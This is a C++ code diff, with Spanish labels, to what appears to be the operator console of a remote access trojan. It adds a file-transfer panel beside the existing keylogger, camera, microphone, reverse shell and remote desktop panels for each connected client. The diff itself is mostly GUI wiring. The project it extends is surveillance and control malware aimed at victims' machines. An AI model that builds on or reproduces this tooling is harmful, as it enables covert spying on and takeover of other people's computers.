@@ -4,6 +4,7 @@
 #include "panel_process_manager.hpp"
 #include "panel_microfono.hpp"
 #include "panel_reverse_shell.hpp"
+#include "panel_transferencias.hpp"
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
 #include "server.hpp"
@@ -37,6 +38,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->strClienteID = strID.substr(0, npos);
     this->strIP = strIP;
 
+    std::cout<<this->strClienteID<<"\n";
+
     wxString strTitle = "[";
     strTitle.append(strID.c_str());
     strTitle.append("] - Admin");
@@ -45,7 +48,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     
-    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450));
+    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID);
     
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
@@ -55,6 +58,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
+    this->m_tree->AppendItem(rootAdmin, wxT("Transferencias"));
 
     //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
 
@@ -131,8 +135,10 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     wxTreeItemId itemID = event.GetItem();
     wxString wStr = GetItemText(itemID);
-    FrameCliente* temp_frame = (FrameCliente*)this->GetParent();
     SOCKET temp_socket = INVALID_SOCKET;
+    std::string temp_strID = "";
+
+    FrameCliente* temp_frame = (FrameCliente*)this->GetParent();
     if (temp_frame) {
         temp_socket = temp_frame->sckCliente;
     }
@@ -165,6 +171,8 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         }else if (wStr == "Escritorio Remoto") {
             frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this);
             frm_temp->Show(true);
+        }else if (wStr == "Transferencias") {
+            this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
         }
 
         this->p_Notebook->Thaw();
